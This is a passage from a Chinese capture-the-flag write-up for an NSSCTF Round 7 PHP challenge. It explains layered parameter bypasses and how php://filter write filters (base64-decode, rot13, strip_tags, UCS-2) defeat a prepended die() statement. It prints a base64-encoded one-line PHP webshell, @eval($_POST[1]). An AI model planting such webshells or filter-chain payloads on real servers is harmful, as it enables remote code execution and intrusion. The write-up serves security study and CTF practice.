                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"N0o0o0oO0o!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoOo00O0o0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noo0oO0oOo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO0o0oO0oO!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No0o0o000O!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO0o0o0o0o!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> NO0o0o0o0o<span class="token operator">!</span>
</code></pre> 
<blockquote> 
 <p>首先是各自绕过，第一层数组绕过，NSSCTF[]=1&amp;NSSCTF[]=2，第二层是in_array()第三个参数没有直接strict导致可以绕过，NsScTF=1q，第三层是伪协议NsScTf=data://text/plain,Welcome to Round7!!!，第四层nss_ctfer.vip注意变为nss[ctfer.vip(因为PHP匹配的时候会自动将[.变成下划线，有且仅变一次)，第五层是intval()绕过，字符串使用科学计数法，会默认是前面的数字，比如’1e1’转化变成1，NSScTf=114514e1，第五层直接nSScTF=1，$nSscTF=NSSRound7。这里的关键是文件上传，通过strops()检测文件的名称是否存在png，直接改增加png即可绕过，关键是会将&lt;?php die(“Round7 do you like”);写入到文件中，所以就导致了传入的虽然是php文件，但是会终止。这里也是使用上面同一个tips，使用过滤器使用文件，如php://filter/write=convert.base64-decode/resource=aiwin.png.php，让写入内容进行base64解码，这里要使用URL编码，绕过/resource=aiwin.png.php作为文件名，然后在文件写入的内容中构造base64，使得&lt;?php die(“Round7 do you like”);被不正常解码，造成死亡绕过。</p> 
</blockquote> 
<p>效果如下：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$strrr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("Round7 do you like");aaaPD9waHAKQGV2YWwoJF9QT1NUWzFdKTsKCj8+'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$strrr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">#输出:�]��h�w{v���X�y��&lt;?php</span>
<span class="token comment">#</span>
<span class="token comment"># @eval($_POST[1]);?&gt;</span>
</code></pre> 
<blockquote> 
 <p>为什么是加了3个a呢，因为使用base64过滤器解码时，php首先会自动跳过不在表中的字符，就变成了phpdieRound7doyoulike，21个字符，base64解码又是以4byte一组，加3个字符变成24个刚好被base64解码，后面我们的一句话木马也刚好被base64成功解码。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/82/b1/GD4ENGNk_o.png" alt="在这里插入图片描述"><br> 这里当然也可以使用其它进行绕过，使用rot13不行，会出现报错，返回数据为空，如下：<br> <img src="https://images2.imgbox.com/7d/7d/i8lH1Jcb_o.png" alt="在这里插入图片描述"><br> 可以使用usc-2等等其它的：<br> <img src="https://images2.imgbox.com/f3/b6/bZgZ8Ntx_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/84/eb/FvbBBVSe_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/aa/21/1QYIN9c5_o.png" alt="在这里插入图片描述"></p> 
<ol start="4"><li>通过蚁剑得到flag<br> <img src="https://images2.imgbox.com/36/f1/bRNvCFH7_o.png" alt="在这里插入图片描述"><br> 除了base64，还有许多绕过，如绕过下面的代码：</li></ol> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php die("Round7 do you like");'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<ol start="5"><li>rot13绕过：rot13会忽略非字母表的字符，通过进行rot13解码，所以也可以进行恶意构造<br> <img src="https://images2.imgbox.com/1b/e1/583pZbk4_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>当然这里利用需要php关闭short_open_tag，使得php开始的缩写标志&lt;??&gt;不使用</p> 
</blockquote> 
<ol start="6"><li>string.strip_tags绕过:从字符串中去除PHP标记，空字符的结果，可以使用|进行多种过滤器完成绕过。<br> <img src="https://images2.imgbox.com/4c/df/N7RdjjU7_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>string.strip_tags直接把&lt;?php die(“Round7 do you like”);给去除掉，然后使用base64解码一句话木马。</p> 
</blockquote> 
<ol start="7"><li>convert.iconv.usc-2、usc-4都一样:对目标字符串进行2位或4位一反转，即将两个字符反转，一般构造的代码得是2的倍数<br> <img src="https://images2.imgbox.com/4e/d7/jK4fGwVb_o.png" alt="在这里插入图片描述"><br> <strong>等等等等</strong></li></ol> 
<blockquote> 
 <p>总的来说，在进行file_get_content(),read()，readfile()时以上原理通过不同的过滤器构造恶意语句，从而使得死亡语句不生效。</p> 
</blockquote>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/dcd164cf2a3a4366e0de76ac201015dd/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">elementUI Steps 步骤条 样式以及方法使用</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9d4c743ea4507aa92de5ca8b3dda1c33/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">uniapp 分页加载吸顶（模仿微信账单）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>